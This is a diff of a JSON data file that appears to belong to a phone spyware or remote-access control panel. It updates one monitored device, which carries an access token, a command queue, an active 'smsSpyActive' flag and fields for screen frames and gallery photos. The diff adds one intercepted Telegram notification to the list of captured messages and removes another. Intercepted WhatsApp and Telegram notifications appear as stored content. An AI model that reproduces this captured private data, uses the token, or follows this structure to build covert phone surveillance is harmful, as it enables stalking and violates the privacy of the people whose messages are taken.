@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775633926930,
+    "lastSeen": 1775633954038,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "15 new messages from 13 chats",
+        "time": "08/04 14:39",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775633956202
+      },
       {
         "appName": "WA Business",
         "sender": "WA Business",
@@ -4318,14 +4326,6 @@
         "time": "08/04 14:23",
         "pkg": "org.telegram.messenger.web",
         "receivedAt": 1775632987975
-      },
-      {
-        "appName": "Telegram",
-        "sender": "STORE Reski",
-        "content": "🖼 ?",
-        "time": "08/04 14:23",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775632987041
       }
     ],
     "galleryPhotos": [],
